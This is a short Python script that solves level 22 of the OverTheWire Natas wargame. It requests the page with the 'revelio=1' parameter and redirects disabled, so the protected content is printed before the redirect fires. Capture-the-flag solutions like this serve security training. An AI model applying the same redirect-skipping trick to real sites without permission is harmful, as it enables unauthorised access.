"""
Help script to resolve natas challenge #22
"""
import requests
import json

level = 'natas22'
url = 'http://{}.natas.labs.overthewire.org/index.php?revelio=1'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level the page will redirect us. We can avoid that easily.
"""
session = requests.Session()
response = session.get(url, auth=auth, allow_redirects=False)
print(response.text)
